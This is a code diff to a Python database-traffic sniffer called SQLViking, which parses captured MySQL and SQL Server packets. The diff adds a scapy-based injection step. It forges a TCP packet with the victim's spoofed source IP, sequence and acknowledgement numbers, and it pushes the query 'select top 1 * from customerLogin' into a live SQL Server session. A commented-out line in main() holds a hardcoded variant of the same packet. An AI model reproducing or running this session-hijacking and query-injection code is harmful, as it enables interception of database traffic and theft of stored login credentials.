@@ -5,7 +5,7 @@ import sys, threading, time
 path.append("pymysql/")
 import connections
 path.append("pytds/")
-import response
+import sqlserver
 
 pkts=Queue()
 queries=Queue()
@@ -27,6 +27,8 @@ class Parse(threading.Thread):
 
     def parse(self,pkt):
         #TODO: determining parser by port. need to account for DBs on non-standard ports.
+        #print '\nSource:\t%s\nTCP Val:\t%s\nAck:\t%s\nSeq:\t%s\n'%(pkt[IP].src,str(pkt[TCP]).encode('hex'),pkt[TCP].ack,pkt[TCP].seq)
+
         if pkt[TCP].sport == 1433 or pkt[TCP].sport == 3306:
             #reassesmble pkts if fragged
             key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
@@ -48,6 +50,9 @@ class Parse(threading.Thread):
                     else:
                         self.parseRespMySQL(str(pkt[TCP])[20:])
         elif pkt[TCP].dport == 1433:
+            if len(pkt[TCP]) == 26:
+                req = sqlserver.Request()
+                send(IP(dst="192.168.37.135",src=pkt[IP].src)/TCP(flags="PA",dport=pkt[TCP].dport,sport=pkt[TCP].sport,seq=pkt[TCP].seq,ack=pkt[TCP].ack)/req.buildRequest("select top 1 * from customerLogin"))
             self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
         elif pkt[TCP].dport == 3306:
             self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])
@@ -92,10 +97,10 @@ class Parse(threading.Thread):
         self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))
 
     def parseRespSQLServ(self,data):
-        resp = response.Response(data)
+        resp = sqlserver.Response(data)
         resp.parse()
         
-        if len(resp.results) == 0:
+        if len(resp.messages) > 0:
             self.logres("--SQLServ Resp--\n%s"%resp.messages[0]['message'])
         else:
             self.logres("--SQLServ Resp--\n%s"%resp.results)
@@ -174,6 +179,8 @@ def parseInput(input,t):
 def main():
     #TODO: better menu. running counter of reqs/resps capped and DBs discovered.
     print('==Welcome to SQLViking!==')
+    
+    #send(IP(dst="192.168.37.135",src="192.168.37.1")/TCP(dport=1433,sport=9999,seq=270991360,ack=270991360)/"select top 1 * from customerLogin")
 
     t1 = Scout()
     t2 = Parse()
@@ -181,7 +188,7 @@ def main():
     t1.start()
     t2.start()
     t3.start()
-    
+
     while True:
         print('\n\n[*] Menu Items:')
         print('\tw - dump current results to file specified')
